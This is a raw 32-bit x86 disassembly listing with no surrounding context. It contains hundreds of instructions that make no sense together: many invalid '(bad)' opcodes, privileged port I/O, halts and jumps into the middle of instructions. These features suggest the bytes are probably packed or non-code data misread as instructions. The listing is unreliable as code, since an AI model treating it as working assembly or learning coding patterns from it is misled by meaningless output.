  416eba:	cmp    ah,BYTE PTR [ecx]
  416ebc:	mov    ds:0xeac3c076,eax
  416ec1:	sbb    ebp,ecx
  416ec3:	add    DWORD PTR [esi+0x7a],ecx
  416ec6:	xor    ebp,0xffffffa6
  416ec9:	add    BYTE PTR [eax],cl
  416ecb:	stos   DWORD PTR es:[edi],eax
  416ecc:	cmp    al,0x2a
  416ece:	repz or eax,0x39033a54
  416ed4:	mov    edx,0xe6256ea7
  416ed9:	icebp  
  416eda:	mov    al,BYTE PTR [edi+0x66]
  416edd:	adc    ebp,eax
  416edf:	inc    eax
  416ee0:	ret    0x6c17
  416ee3:	hlt    
  416ee4:	sbb    bl,BYTE PTR [edi-0x243a706d]
  416eea:	jns    0x416e8b
  416eec:	mov    edi,0xa5bf0255
  416ef1:	adc    ch,BYTE PTR [ebp+0x7c3d12e9]
  416ef7:	aaa    
  416ef8:	xchg   edi,ecx
  416efa:	sub    ebx,DWORD PTR [ecx]
  416efc:	and    BYTE PTR [ebx+0x6ba00fda],ch
  416f02:	cmp    BYTE PTR [eax-0x1e],dl
  416f05:	pop    edi
  416f06:	dec    ecx
  416f07:	loope  0x416f56
  416f09:	fwait
  416f0a:	sbb    eax,0x27ad5b67
  416f0f:	xchg   ebp,eax
  416f10:	mov    WORD PTR [edi],?
  416f12:	pcmpeqw mm5,QWORD PTR [edx-0x38]
  416f16:	jge    0x416f52
  416f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f19:	aad    0xf9
  416f1b:	jg     0x416f60
  416f1d:	sbb    eax,0x7a636e14
  416f22:	rcr    BYTE PTR [eax],0x1c
  416f25:	mov    al,0xac
  416f27:	fs (bad) 
  416f29:	(bad)  
  416f2a:	clc    
  416f2b:	lahf   
  416f2c:	nop
  416f2d:	out    0xc7,al
  416f2f:	sbb    edi,ebx
  416f31:	mov    al,0x58
  416f33:	pop    edi
  416f34:	loopne 0x416ec5
  416f36:	call   0xdca6:0x158387c8
  416f3d:	push   ds
  416f3e:	pushw  ds
  416f40:	popf   
  416f41:	lds    eax,FWORD PTR [ebx-0x40]
  416f44:	cmp    edi,DWORD PTR [esi+0xf]
  416f47:	(bad)  
  416f49:	ds cmc 
  416f4b:	test   al,0xc5
  416f4d:	pop    edi
  416f4e:	lods   eax,DWORD PTR ds:[esi]
  416f4f:	outs   dx,BYTE PTR ds:[esi]
  416f50:	je     0x416fb5
  416f52:	out    dx,eax
  416f53:	jmp    0xae6e:0x48fa268d
  416f5a:	dec    esi
  416f5b:	daa    
  416f5c:	std    
  416f5d:	inc    ecx
  416f5e:	test   BYTE PTR [eax+0x63],ah
  416f61:	add    ch,BYTE PTR [esi-0x7b]
  416f64:	inc    edx
  416f65:	(bad)  
  416f66:	gs mov eax,0xb3de10ce
  416f6c:	xchg   edi,eax
  416f6d:	mov    edx,0x606178cf
  416f72:	ror    DWORD PTR ds:0x8bf99032,1
  416f78:	mov    al,ds:0x755aff98
  416f7d:	adc    al,0x3b
  416f7f:	cmc    
  416f80:	xlat   BYTE PTR ds:[ebx]
  416f81:	sbb    ch,BYTE PTR [edi-0x24768b24]
  416f87:	hlt    
  416f88:	sub    eax,0x9b4c57a9
  416f8d:	(bad)  
  416f8e:	xor    ebx,ecx
  416f90:	out    dx,eax
  416f91:	xor    DWORD PTR [edi+0xf],ebx
  416f94:	or     eax,DWORD PTR [eax]
  416f96:	jno    0x416fc5
  416f98:	rcr    BYTE PTR [esi],0x69
  416f9b:	in     eax,dx
  416f9c:	test   al,0x1f
  416f9e:	dec    ebx
  416f9f:	and    al,0x52
  416fa1:	mov    edx,0x167fc716
  416fa6:	lods   al,BYTE PTR ds:[esi]
  416fa7:	mov    al,BYTE PTR [eax]
  416fa9:	lahf   
  416faa:	push   edi
  416fab:	cli    
  416fac:	bound  esp,QWORD PTR [eax-0xf]
  416faf:	loopne 0x41700c
  416fb1:	lea    eax,[edx+edi*4-0x53a3d706]
  416fb8:	push   esp
  416fb9:	sbb    dl,BYTE PTR [edi+0x2b]
  416fbc:	mov    cl,0xe0
  416fbe:	inc    ebp
  416fbf:	fld    TBYTE PTR ds:0xe0c877c
  416fc5:	mov    edx,0xec14b95e
  416fca:	dec    ecx
  416fcb:	cwde   
  416fcc:	or     DWORD PTR [ebp+ecx*4-0x6bb4ef90],edi
  416fd3:	stos   DWORD PTR es:[edi],eax
  416fd4:	icebp  
  416fd5:	dec    edi
  416fd6:	fmul   st,st(6)
  416fd8:	rol    BYTE PTR [ebp-0x17],1
  416fdb:	pop    ss
  416fdc:	push   0x36a752e7
  416fe1:	jbe    0x417010
  416fe3:	xchg   ebx,eax
  416fe4:	or     eax,0x31b7656b
  416fe9:	pop    ecx
  416fea:	mov    ch,0x6f
  416fec:	or     DWORD PTR [ebx-0x36b68ae5],0xffffffab
  416ff3:	jp     0x416fe7
  416ff5:	cdq    
  416ff6:	mul    al
  416ff8:	cdq    
  416ff9:	aad    0x0
  416ffb:	jne    0x417020
  416ffd:	dec    ebp
  416ffe:	mov    dh,0xed
  417000:	pop    edi
  417001:	sbb    eax,0x2ae9758c
  417006:	cli    
  417007:	sub    al,0x8a
  417009:	adc    eax,eax
  41700b:	add    DWORD PTR ds:0x4901217d,0x8ad6be31
  417015:	cs loop 0x41703b
  417018:	mov    cl,BYTE PTR [ebx-0x7c]
  41701b:	(bad)  
  41701c:	neg    esi
  41701e:	jb     0x417093
  417020:	out    0x9a,al
  417022:	pop    edi
  417023:	push   ebp
  417024:	mov    bl,BYTE PTR [edx-0x5d3d5103]
  41702a:	mov    ecx,0xb15d87ea
  41702f:	push   0x30
  417031:	fcom   QWORD PTR [eax-0x71]
  417034:	sub    DWORD PTR [edi+0x2e],edx
  417037:	xor    DWORD PTR [esi+0x456dd053],ebx
  41703d:	mov    eax,ds:0xbb7cd770
  417042:	loopne 0x4170b6
  417044:	pop    edi
  417045:	pop    ebx
  417046:	mov    ebx,0xb3144a0b
  41704b:	(bad)  
  41704c:	(bad)  
  41704d:	jge    0x417069
  41704f:	out    dx,al
  417050:	lods   al,BYTE PTR ds:[esi]
  417051:	xchg   esi,eax
  417052:	lahf   
  417053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417054:	(bad)  
  417056:	jo     0x4170ad
  417058:	lods   eax,DWORD PTR ds:[esi]
  417059:	into   
  41705a:	mov    dl,0x3
  41705c:	pop    ebp
  41705d:	add    eax,0xe477f50a
  417062:	es icebp 
  417064:	push   ss
  417065:	pop    eax
  417066:	ret    0x9b27
  417069:	pushf  
  41706a:	vmwrite edx,DWORD PTR [esp+eiz*4+0x13]
  41706f:	scas   eax,DWORD PTR es:[edi]
  417070:	fmul   QWORD PTR [ebx-0x3e]
  417073:	push   0x111972d3
  417078:	fistp  QWORD PTR [ebp-0x37]
  41707b:	jg     0x4170f9
  41707d:	cmp    dh,BYTE PTR gs:[esp+ebp*8+0x67]
  417082:	mov    esi,eax
  417084:	inc    ecx
  417085:	sar    DWORD PTR [eax],0x75
  417088:	setno  BYTE PTR [esi]
  41708b:	aas    
  41708c:	je     0x417080
  41708e:	js     0x4170a4
  417090:	int3   
  417091:	jmp    FWORD PTR [ecx]
  417093:	sub    esi,DWORD PTR [ebx+0x36]
  417096:	jno    0x4170e6
  417098:	sti    
  417099:	fimul  DWORD PTR [edi]
  41709b:	adc    ch,BYTE PTR [ebp-0x4f]
  41709e:	pop    ebx
  41709f:	cwde   
  4170a0:	pushf  
  4170a1:	mov    ebx,fs
  4170a3:	adc    eax,0x46c9f4ba
  4170a8:	aad    0x23
  4170aa:	inc    ebp
  4170ab:	imul   DWORD PTR [edx+0x5d]
  4170ae:	fwait
  4170af:	lods   al,BYTE PTR ds:[esi]
  4170b0:	rcr    BYTE PTR [ecx],1
  4170b2:	cmc    
  4170b3:	mov    esp,0x3590e97f
  4170b8:	icebp  
  4170b9:	push   cs
  4170ba:	mul    DWORD PTR [edi]
  4170bc:	xchg   ebx,eax
  4170bd:	push   ecx
  4170be:	push   es
  4170bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170c0:	sti    
  4170c1:	cmp    eax,0xb8d4aab
  4170c6:	adc    BYTE PTR [esi],dh
  4170c8:	(bad)  
  4170c9:	cli    
  4170ca:	mov    bl,0x3b
  4170cc:	cwde   
  4170cd:	shr    ecx,1
  4170cf:	lea    ebx,[ebx-0x45970829]
  4170d5:	or     bh,BYTE PTR [eax+esi*4]
  4170d8:	and    cl,BYTE PTR [edx+0xc4c91f6]
  4170de:	ret    
  4170df:	fisttp WORD PTR [eiz*4+0x603c2bb0]
  4170e6:	mov    esi,0xd5f5d81a
  4170eb:	test   eax,0x6960866a
  4170f0:	xchg   ebx,eax
  4170f1:	mov    eax,0x601548c1
  4170f6:	comiss xmm0,DWORD PTR ds:0x7f33ccfc
  4170fd:	push   ebx
  4170fe:	or     ecx,DWORD PTR [eax+esi*8-0x6d]
  417102:	and    al,0xf1
  417104:	jno    0x41709e
  417106:	(bad)  
  417109:	push   0xffffffed
  41710b:	addr16 in eax,0x24
  41710e:	adc    DWORD PTR [esi+0x46],ebx
  417111:	push   ebp
  417112:	pusha  
  417113:	retf   
  417114:	in     eax,0x9d
  417116:	aam    0x11
  417118:	mov    DWORD PTR [ebp+ebx*1-0x73],ebx
  41711c:	jp     0x417123
  41711e:	repnz or bh,al
  417121:	jb     0x417120
  417123:	push   esp
  417124:	xchg   esp,eax
  417125:	xor    DWORD PTR [ebx+0x329d072],ebx
  41712b:	xor    DWORD PTR [edi+0x73ad3872],eax
  417131:	xchg   ebx,eax
  417132:	dec    ebx
  417133:	rcr    DWORD PTR [esi+0x5b],cl
  417136:	call   0x1e627895
  41713b:	push   es
  41713c:	mov    cs,WORD PTR [edi]
  41713e:	inc    edi
  41713f:	int    0xa2
  417141:	jns    0x417150
  417143:	pop    ebx
  417144:	cmp    eax,0xefdfc751
  417149:	ds add al,0xd7
  41714c:	sbb    DWORD PTR [edi],esp
  41714e:	jbe    0x417134
  417150:	sub    BYTE PTR [edx],cl
  417152:	stos   DWORD PTR es:[edi],eax
  417153:	div    BYTE PTR [ecx+0xd]
  417156:	ins    BYTE PTR es:[edi],dx
  417157:	pop    gs
  417159:	mov    edi,0x8e609d4
  41715e:	mov    al,ds:0x6648a562
  417163:	adc    dh,BYTE PTR [edi+0x2ddf126a]
  417169:	and    dl,BYTE PTR [esi+eax*2+0x15f13d7]
  417170:	xchg   BYTE PTR [edi-0xc],cl
  417173:	fld    DWORD PTR [edi-0x3f3c3684]
  417179:	(bad)  ds:0x6df527d5
  41717f:	out    0xf,al
  417181:	ret    
  417182:	pop    ebx
  417183:	xchg   DWORD PTR [edx+0x66d0a250],esi
  417189:	dec    ebx
  41718a:	jno    0x417151
  41718c:	inc    esp
  41718d:	js     0x4171fd
  41718f:	pop    es
  417190:	pusha  
  417191:	inc    edx
  417192:	addr16 data16 jns 0x4171ba
  417196:	adc    eax,0xc593f318
  41719b:	clc    
  41719c:	jmp    0xafea:0x6abd784a
  4171a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171a4:	out    dx,eax
  4171a5:	xor    BYTE PTR [esi+edi*1+0x20],ah
  4171a9:	ret    0x1c41
  4171ac:	aad    0x79
  4171ae:	pavgw  mm2,QWORD PTR [edx-0x577fa867]
  4171b5:	rcr    DWORD PTR [ebp-0x2e],0x82
  4171b9:	test   eax,0xba7f0958
  4171be:	sbb    al,BYTE PTR ds:0x5fb0bbdc
  4171c4:	stos   BYTE PTR es:[edi],al
  4171c5:	and    esp,eax
  4171c7:	stos   DWORD PTR es:[edi],eax
  4171c8:	sub    al,0xe2
  4171ca:	shl    esp,0x3
  4171cd:	ffree  st(6)
  4171cf:	stos   DWORD PTR es:[edi],eax
  4171d0:	jle    0x41719b
  4171d2:	xchg   ecx,eax
  4171d3:	in     eax,0x1a
  4171d5:	cmp    cl,BYTE PTR [edx]
  4171d7:	pop    ebx
  4171d8:	dec    esp
  4171d9:	lods   eax,DWORD PTR ds:[esi]
  4171da:	ds pushf 
  4171dc:	xlat   BYTE PTR ds:[ebx]
  4171dd:	mov    edi,0xa9c267d1
  4171e2:	imul   ebx,ecx,0xe88c4609
  4171e8:	mov    ah,BYTE PTR [edx]
  4171ea:	push   edx
  4171eb:	pop    ebp
  4171ec:	stc    
  4171ed:	adc    BYTE PTR [edx-0x5210a5b],0xb6
  4171f4:	mov    bh,0xf4
  4171f6:	sbb    DWORD PTR [edi+0x6651aaa3],esp
  4171fc:	fisubr WORD PTR [edi]
  4171fe:	pushf  
  4171ff:	push   0x4f067141
  417204:	inc    eax
  417205:	sub    eax,0xc692774d
  41720a:	inc    ecx
  41720b:	mov    bh,0x53
  41720d:	(bad)  
  41720e:	jmp    0x4171fe
  417210:	or     ah,BYTE PTR [ecx+0x17b79721]
  417216:	cdq    
  417217:	sbb    eax,DWORD PTR [eax+0x35]
  41721a:	push   ebp
  41721b:	les    eax,FWORD PTR [ecx+0x1a5a778c]
  417221:	inc    ebp
  417222:	sbb    DWORD PTR [esp+edi*2-0x298be641],ebx
  417229:	out    0x17,al
  41722b:	cdq    
  41722c:	push   esp
  41722d:	pop    esp
  41722e:	pop    esi
  41722f:	or     dh,BYTE PTR [edi+0x4dbed907]
  417235:	add    al,ch
  417237:	inc    esp
  417238:	dec    eax
  417239:	imul   eax,DWORD PTR [edi-0x78758b50],0x19
  417240:	xchg   BYTE PTR ds:0xe45bbb58,dl
  417246:	pop    ebx
  417247:	ret    
  417248:	es loop 0x417267
  41724b:	stc    
  41724c:	out    0x2d,eax
  41724e:	adc    eax,0x9977dae2
  417253:	add    al,0xb8
  417255:	loopne 0x41723a
  417257:	and    edx,edx
  417259:	cld    
  41725a:	jp     0x41724e
  41725c:	add    eax,0xce46f43d
  417261:	inc    eax
  417262:	and    al,0x3e
  417264:	dec    edx
  417265:	ds ja  0x417229
  417268:	icebp  
  417269:	jbe    0x41720e
  41726b:	and    al,0x7c
  41726d:	sub    bl,BYTE PTR ds:0xb36f7a87
  417273:	neg    edx
  417275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417277:	jns    0x41727c
  417279:	sub    bh,BYTE PTR [edi-0x56889494]
  41727f:	mov    WORD PTR [ebx+0x2b],?
  417282:	xchg   ecx,eax
  417283:	out    dx,eax
  417284:	popf   
  417285:	call   0xd159b20
  41728a:	mov    eax,eax
  41728c:	jmp    eax
  41728e:	rcl    BYTE PTR [ebp-0x7a370728],1
  417294:	(bad)  
  417295:	into   
  417296:	add    DWORD PTR [esi],ebp
  417298:	mov    edi,0x99a5d8f2
  41729d:	test   al,0x3e
  41729f:	push   esi
  4172a0:	jmp    0x417229
  4172a2:	inc    esi
  4172a3:	ficomp DWORD PTR [eax]
  4172a5:	jp     0x4172e9
  4172a7:	xchg   BYTE PTR [eax],dl
  4172a9:	mov    bh,0x51
  4172ab:	es (bad) 
  4172ad:	out    dx,eax
  4172ae:	inc    eax
  4172af:	scas   al,BYTE PTR es:[edi]
  4172b0:	retf   0xfde1
  4172b3:	pushf  
  4172b4:	fbstp  TBYTE PTR [ebx]
  4172b6:	mov    ecx,0x4c7c562b
  4172bb:	out    dx,al
  4172bc:	outs   dx,DWORD PTR ds:[esi]
  4172bd:	inc    eax
  4172be:	pop    eax
  4172bf:	and    al,0x5d
  4172c1:	daa    
  4172c2:	jne    0x4172a2
  4172c4:	inc    ebp
  4172c5:	jne    0x417270
  4172c7:	mov    ch,0xb0
  4172c9:	dec    ebp
  4172ca:	lods   eax,DWORD PTR ds:[esi]
  4172cb:	mov    bl,0xae
  4172cd:	jae    0x417268
  4172cf:	in     eax,0x28
  4172d1:	scas   al,BYTE PTR es:[edi]
  4172d2:	mov    WORD PTR [esi+0x60],ds
  4172d5:	xchg   esi,eax
  4172d6:	mov    ebx,0xc26b55d2
  4172dc:	gs stos DWORD PTR es:[edi],eax
  4172de:	mov    esp,0xb5fa14b
  4172e3:	jmp    FWORD PTR [ecx+ebp*1]
  4172e6:	add    BYTE PTR [ebx+eiz*1-0x3e],dh
  4172ea:	ja     0x417352
  4172ec:	push   ebx
  4172ed:	add    al,0x85
  4172ef:	mov    cl,0x6f
  4172f1:	sbb    cl,BYTE PTR [edi+0x3]
  4172f4:	xor    cl,BYTE PTR [eax]
  4172f6:	and    DWORD PTR [edx-0x61],esi
  4172f9:	adc    ch,bh
  4172fb:	mov    al,0xc2
  4172fd:	int3   
  4172fe:	and    ebx,DWORD PTR [ecx+0x32ad1a63]
  417304:	sar    DWORD PTR [edx+0x6f],0x9b
  417308:	stos   DWORD PTR es:[edi],eax
  417309:	mov    bl,0x81
  41730b:	dec    ecx
  41730c:	out    dx,eax
  41730d:	sub    al,0x9c
  41730f:	(bad)  
  417310:	sub    bh,BYTE PTR [edx+0x38fe9e30]
  417316:	aaa    
  417317:	lock clc 
  417319:	jl     0x41730b
  41731b:	pop    ds
  41731c:	(bad)  
  41731d:	repnz mov esp,0xd916f7af
  417323:	pop    edx
  417324:	gs push esp
  417326:	xchg   edx,eax
  417327:	add    al,0xc3
  417329:	out    dx,eax
  41732a:	jl     0x417358
  41732c:	lahf   
  41732d:	int    0x65
  41732f:	iret   
  417330:	sahf   
  417331:	fdiv   QWORD PTR [eax+0x7199a3e3]
  417337:	add    eax,0x2959de72
  41733c:	sub    BYTE PTR [ecx],0x92
  41733f:	mov    ebx,DWORD PTR [esi]
  417341:	inc    ebp
  417342:	push   eax
  417343:	sbb    edx,DWORD PTR [ebx]
  417345:	pop    ss
  417346:	cmp    ebx,DWORD PTR [edx-0x5d]
  417349:	out    0x26,al
  41734b:	fdivr  st,st(5)
  41734d:	es xchg esi,eax
  41734f:	pop    ss
  417350:	jp     0x4173ce
  417352:	adc    edi,ecx
  417354:	push   0x51868f6c
  417359:	mov    ah,0x2
  41735b:	and    BYTE PTR [esi+edx*8],dl
  41735e:	jl     0x4172e0
  417360:	(bad)  
  417361:	dec    ebx
  417362:	jg     0x4173d9
  417364:	cld    
  417365:	xor    al,0x34
  417367:	add    eax,0x62014813
  41736c:	mov    al,ds:0xd4c2bcc3
  417371:	loop   0x4173cb
  417373:	cwde   
  417374:	je     0x41736c
  417376:	push   cs
  417377:	mov    dl,dl
  417379:	retf   0x9413
  41737c:	pusha  
  41737d:	rcr    DWORD PTR [edx],0xe8
  417380:	scas   al,BYTE PTR es:[edi]
  417381:	push   es
  417382:	(bad)  
  417383:	xor    esi,eax
  417385:	jno    0x4173a9
  417387:	mov    WORD PTR [edx+0xf],cs
  41738a:	inc    ebp
  41738b:	repnz xchg ebp,eax
  41738d:	cmp    edx,0x15d63594
  417393:	in     al,0xa4
  417395:	(bad)  
  417396:	adc    edx,DWORD PTR [edi+0x7]
  417399:	fcom   DWORD PTR [ebp+0x5dbbc9a3]
  41739f:	xchg   esi,eax
  4173a0:	gs add eax,0x48109f59
  4173a6:	jns    0x417367
  4173a8:	ins    BYTE PTR es:[edi],dx
  4173a9:	mov    edi,0x221e9ac2
  4173ae:	dec    esi
  4173af:	stos   BYTE PTR es:[edi],al
  4173b0:	test   BYTE PTR [eax+ecx*4-0x79],ah
  4173b4:	xor    esi,0xe2d81aad
  4173ba:	mov    edx,0x277ca29
  4173bf:	stos   BYTE PTR es:[di],al
  4173c1:	sub    al,0xa5
  4173c3:	sub    DWORD PTR [ecx+edi*4+0xbe84639],eax
  4173ca:	jno    0x41742d
  4173cc:	sbb    BYTE PTR [ebp+0x584f4150],cl
  4173d2:	out    dx,al
  4173d3:	sub    eax,0xc5400eef
  4173d8:	pop    ss
  4173d9:	push   0x10
  4173db:	pop    es
  4173dc:	rcl    DWORD PTR [ecx],0x8e
  4173df:	jle    0x4173f2
  4173e1:	adc    ebp,esp
  4173e3:	bound  esi,QWORD PTR [edx-0x69]
  4173e6:	pop    ecx
  4173e7:	aas    
  4173e8:	sbb    DWORD PTR [ebx+0x77],edx
  4173eb:	dec    eax
  4173ec:	fwait
  4173ed:	jl     0x4173ae
  4173ef:	or     eax,0x3a7f0a5a
  4173f4:	mov    esi,DWORD PTR [esi+0x54]
  4173f7:	repz repnz pop edx
  4173fa:	inc    ebp
  4173fb:	test   al,0x9e
  4173fd:	jg     0x41737f
  4173ff:	xor    BYTE PTR ds:0x3f9dfa46,ch
  417405:	push   edx
  417406:	loope  0x41742c
  417408:	push   esp
  417409:	xchg   edx,eax
  41740a:	or     eax,0x57e1edfa
  41740f:	push   edx
  417410:	scas   eax,DWORD PTR es:[edi]
  417411:	nop
  417412:	dec    edi
  417413:	leave  
  417414:	push   eax
  417415:	je     0x4173a4
  417417:	inc    edx
  417418:	cmp    DWORD PTR cs:[ebx+0x6ee8fc9c],ebp
  41741f:	sub    eax,0x1e323c92
  417424:	xor    eax,0xc31470f
  417429:	or     ah,cl
  41742b:	cmp    DWORD PTR [edi-0x25],edx
  41742e:	jmp    0xc9bbe261
  417433:	cs mov esp,0x7c76c0a9
  417439:	cdq    
  41743a:	sbb    DWORD PTR [edi-0x51],esi
  41743d:	cld    
  41743e:	ins    DWORD PTR es:[edi],dx
  41743f:	inc    esp
  417440:	rcr    BYTE PTR ds:0x56231e5,cl
  417446:	das    
  417447:	dec    ebx
  417448:	add    eax,0x376069a7
  41744d:	and    DWORD PTR [eax+0x17a89a89],ebx
  417453:	popf   
  417454:	sub    ch,BYTE PTR [edi]
  417456:	dec    esi
  417457:	cmp    eax,0xb25421e7
  41745c:	pusha  
  41745d:	mov    ecx,DWORD PTR [edx-0x7fb87fc6]
  417463:	adc    eax,0x9403d4ff
  417468:	mov    ebp,0xc1ec0556
  41746d:	xchg   DWORD PTR [ecx*8+0x7483768],edx
  417474:	mov    ch,0x6a
  417476:	sbb    eax,0x9d4ee746
  41747b:	pushf  
  41747c:	mov    bl,0xb2
  41747e:	cmp    eax,ebx
  417480:	out    dx,eax
  417481:	mov    ds,ebx
  417483:	mov    al,ds:0x3ab9f00c
  417488:	fdivp  st(5),st
  41748a:	inc    esi
  41748b:	sbb    bl,BYTE PTR [edi+0x794be811]
  417491:	cmp    cl,BYTE PTR [esi]
  417493:	or     ah,BYTE PTR [edi-0x72]
  417496:	mov    DWORD PTR [eax+ecx*4],0xf9208e4f
  41749d:	inc    ebp
  41749e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41749f:	ja     0x417517
  4174a1:	xor    DWORD PTR [ebx],0x37
  4174a4:	and    dl,BYTE PTR [ecx]
  4174a6:	pop    esi
  4174a7:	sbb    DWORD PTR [ebx+0x4],esi
  4174aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174ab:	loope  0x4174a8
  4174ad:	jae    0x4174f3
  4174af:	mov    esp,esi
  4174b1:	mov    cl,0xae
  4174b3:	push   edx
  4174b4:	mov    ss,WORD PTR [ecx-0x5b]
  4174b7:	pop    ebp
  4174b8:	sbb    BYTE PTR [ebx],dl
  4174ba:	stos   DWORD PTR es:[edi],eax
  4174bb:	mov    esp,0x46c42b4a
  4174c0:	rol    BYTE PTR fs:[ebp+0x28],0x21
  4174c5:	jmp    0x41747e
  4174c7:	or     eax,DWORD PTR [ecx-0x7c]
  4174ca:	mov    eax,ds:0x7072a075
  4174cf:	and    dl,BYTE PTR [ecx+0x1a74ef57]
  4174d5:	test   al,0xeb
  4174d7:	sub    esi,DWORD PTR [edx]
  4174d9:	hlt    
  4174da:	dec    eax
  4174db:	aaa    
  4174dc:	int3   
  4174dd:	or     ebp,edi
  4174df:	cmp    esp,ebp
  4174e1:	arpl   cx,bx
  4174e3:	into   
  4174e4:	cmp    DWORD PTR [eax+0x39337451],edi
  4174ea:	mov    ah,0x24
  4174ec:	sub    DWORD PTR [edx],ecx
  4174ee:	clc    
  4174ef:	in     al,dx
  4174f0:	out    dx,al
  4174f1:	lods   al,BYTE PTR ds:[esi]
  4174f2:	cmp    eax,0x35aba2fa
  4174f7:	dec    esi
  4174f8:	ret    0x4176
  4174fb:	out    dx,al
  4174fc:	pop    ebp
  4174fd:	push   0x35c07a2d
  417502:	and    eax,0x76f366ff
  417507:	lock jno 0x417516
  41750a:	call   0x90c8:0x2a511bd8
  417511:	test   BYTE PTR [edi-0x130f740a],0xcd
  417518:	aad    0x6f
  41751a:	test   DWORD PTR [edx+0x27397c63],edx
  417520:	out    dx,al
  417521:	cmp    BYTE PTR ds:0x97dadbb1,0x4c
  417528:	push   edx
  417529:	or     edi,DWORD PTR [edi-0x726845b8]
  41752f:	pop    esp
  417530:	sahf   
  417531:	pop    edx
  417532:	or     ebp,ebp
  417534:	int3   
  417535:	mov    ebx,0x814f084d
  41753a:	dec    DWORD PTR [edx]
  41753c:	sub    ah,BYTE PTR [ecx+0x5b]
  41753f:	sti    
  417540:	lods   al,BYTE PTR ds:[esi]
  417541:	xchg   edx,eax
  417542:	mov    ecx,0x318f1baf
  417547:	in     al,0xf
  417549:	xchg   esp,eax
  41754a:	add    eax,edx
  41754c:	xchg   ebp,eax
  41754d:	div    BYTE PTR [ebp+0x75]
  417550:	lods   eax,DWORD PTR ds:[esi]
  417551:	scas   al,BYTE PTR es:[edi]
  417552:	pop    edi
  417553:	outs   dx,BYTE PTR ds:[esi]
  417554:	add    al,0x15
  417556:	rol    BYTE PTR [eax+eax*2],1
  417559:	jecxz  0x417570
  41755b:	add    eax,0x672f34c6
  417560:	repnz fld DWORD PTR [edi-0x58]
  417564:	pop    ebp
  417565:	jo     0x4175e2
  417567:	jnp    0x41753c
  417569:	popa   
  41756a:	pop    ebx
  41756b:	sbb    eax,0x943dda4b
  417570:	or     dl,bh
  417572:	push   ecx
  417573:	pop    esp
  417574:	mov    edi,0x4f0dae80
  417579:	mov    al,ds:0xb7ddebd9
  41757e:	mov    ds:0x205b33e9,eax
  417583:	push   ebp
  417584:	dec    eax
  417585:	(bad)  
  417588:	pop    edi
  417589:	dec    edx
  41758a:	les    esp,FWORD PTR [edx-0x15a12566]
  417590:	into   
  417591:	mov    esi,0x58f90b16
  417596:	or     bl,BYTE PTR [ebx+0x19]
  417599:	test   eax,0xf86ecc30
  41759e:	jp     0x4175e2
  4175a0:	mov    BYTE PTR [edx-0x2c],dl
  4175a3:	popa   
  4175a4:	dec    ebx
  4175a5:	sahf   
  4175a6:	pushf  
  4175a7:	btr    DWORD PTR [edi],eax
  4175aa:	push   ecx
  4175ab:	xchg   esi,eax
  4175ac:	inc    ecx
  4175ad:	sub    al,0xde
  4175af:	lahf   
  4175b0:	fadd   QWORD PTR [edi]
  4175b2:	jl     0x4175a5
  4175b4:	mov    BYTE PTR [ecx],al
  4175b6:	sbb    cl,BYTE PTR [esp+edx*1-0x5b59c4e7]
  4175bd:	iret   
  4175be:	xor    eax,DWORD PTR [eax+0x7817efab]
  4175c4:	cwde   
  4175c5:	sbb    BYTE PTR [edi],al
  4175c7:	popa   
  4175c8:	cwde   
  4175c9:	aas    
  4175ca:	inc    edx
  4175cb:	mov    ch,0xa1
  4175cd:	and    DWORD PTR [ecx+eiz*1],esp
  4175d0:	jne    0x417597
  4175d2:	xchg   esp,eax
  4175d3:	adc    DWORD PTR [ebp-0x73daa47c],ebx
  4175d9:	stos   BYTE PTR es:[edi],al
  4175da:	jg     0x41762d
  4175dc:	cmp    eax,0x265b0e22
  4175e1:	imul   ebp,esp,0x20162d42
  4175e7:	mov    DWORD PTR [eax-0x22efd146],eax
  4175ed:	lock push ebx
  4175ef:	sub    BYTE PTR [edi-0x6ae5b395],dh
  4175f5:	sbb    eax,0x6de67210
  4175fa:	stc    
  4175fb:	and    DWORD PTR [ecx],ecx
  4175fd:	pop    ebx
  4175fe:	sub    al,BYTE PTR [edx-0x14a2ddd5]
  417604:	ja     0x4175af
  417606:	sub    ah,BYTE PTR [edx+0x7c561960]
  41760c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41760d:	jns    0x417602
  41760f:	mov    dl,BYTE PTR ss:[eax]
  417612:	mov    ds:0x7fd88556,eax
  417617:	ss mov edi,0x8696a310
  41761d:	mov    bl,0xb7
  41761f:	sbb    al,0x4e
  417622:	mov    bh,0xe1
  417624:	ret    
  417625:	ret    0x7eb5
  417628:	inc    ebx
  417629:	repz inc esp
  41762b:	xchg   ebp,eax
  41762c:	adc    DWORD PTR [eax],0xdda57a9
  417632:	(bad)  
  417633:	mov    cs,WORD PTR [esi+0x75]
  417636:	in     eax,0x56
  417638:	xchg   edi,eax
  417639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41763a:	push   ds
  41763b:	mov    DWORD PTR [esi+edx*4+0x5b],esi
  41763f:	pop    edi
  417640:	xchg   esi,eax
  417641:	jnp    0x4176aa
  417643:	jae    0x417674
  417645:	dec    esi
  417646:	mov    esi,0x345d4b6c
  41764b:	(bad)
  41764f:	stos   BYTE PTR es:[edi],al
  417650:	loop   0x41761b
  417652:	push   eax
  417653:	in     al,dx
  417654:	sbb    BYTE PTR cs:[esp+eax*1],bl
  417658:	cdq    
  417659:	aam    0x9c
  41765b:	pop    ecx
  41765c:	pop    esp
  41765d:	adc    BYTE PTR [edi+0x6adc3350],bl
  417663:	sbb    BYTE PTR [esi+0x34],cl
  417666:	adc    dh,BYTE PTR [ebp-0x27]
  417669:	pop    esp
  41766a:	dec    ebp
  41766b:	adc    BYTE PTR [edx],al
  41766d:	cli    
  41766e:	shl    cl,0x6b
  417671:	enter  0x4029,0xc6
  417675:	add    edx,0xe06f50ce
  41767b:	sbb    al,0xbb
  41767d:	push   ss
  41767e:	leave  
  41767f:	pop    esi
  417680:	(bad)  ds:0xd66c92ea
  417686:	add    bl,BYTE PTR [edx]
  417688:	sub    DWORD PTR [edi-0x55d8b066],eax
  41768e:	pop    ebp
